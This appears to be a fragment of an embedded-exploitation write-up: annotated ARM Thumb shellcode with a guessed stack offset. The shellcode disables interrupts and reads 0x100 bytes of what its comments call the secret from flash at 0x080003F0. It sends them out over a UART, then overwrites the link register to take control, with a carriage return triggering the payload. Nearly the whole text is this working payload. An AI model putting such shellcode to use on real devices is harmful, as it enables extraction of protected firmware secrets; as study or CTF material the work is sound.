
Offset guessed: 
	20017fc1
	00000000 72 b6           cpsid      i			; stop interrupts
        00000002 44 f2 1c 42     movw       r2,#0x441c
        00000006 c4 f2 00 02     movt       r2,#0x4000		; r2 = 0x4000441C  UART base @
        0000000a 4f f4 7c 73     mov.w      r3,#0x3f0
        0000000e c0 f6 00 03     movt       r3,#0x800		; r3 = 0x080003F0  offset to leak (secret)
        00000012 4f f4 80 74     mov.w      r4,#0x100		; r4 0x100 bytes to leak
                             LAB_00000016
        00000016 13 f8 01 1b     ldrb.w     r1,[r3],#0x1	; r1 = current byte to leak (add 1 to addr the same time)
        0000001a 11 73           strb       r1,[r2,#0xc]	; store it to UART send adress
                             LAB_0000001c
        0000001c 16 68           ldr        r6,[r2,#0x0]	; r6 = UART state
        0000001e 16 f0 40 06     ands       r6,r6,#0x40		; r6 = keep 1 bit, 0=BUSY
        00000022 00 2e           cmp        r6,#0x0
        00000024 fa d0           beq        LAB_0000001c	; active pooling until byte sent over serial
        00000026 a4 f1 01 04     sub.w      r4,r4,#0x1		; sub 1 byte
        0000002a 00 2c           cmp        r4,#0x0		; do it until 0
        0000002c f3 d1           bne        LAB_00000016
        0000002e 00 bf           nop				; die later ...
        00000030 00 bf           nop
        00000032 00 bf           nop
        00000034 c1 7f 01 20     addr       DAT_20017fc1	; LR offset, take the control here
        00000038 0a              db         Ah			; CR to trig the payload

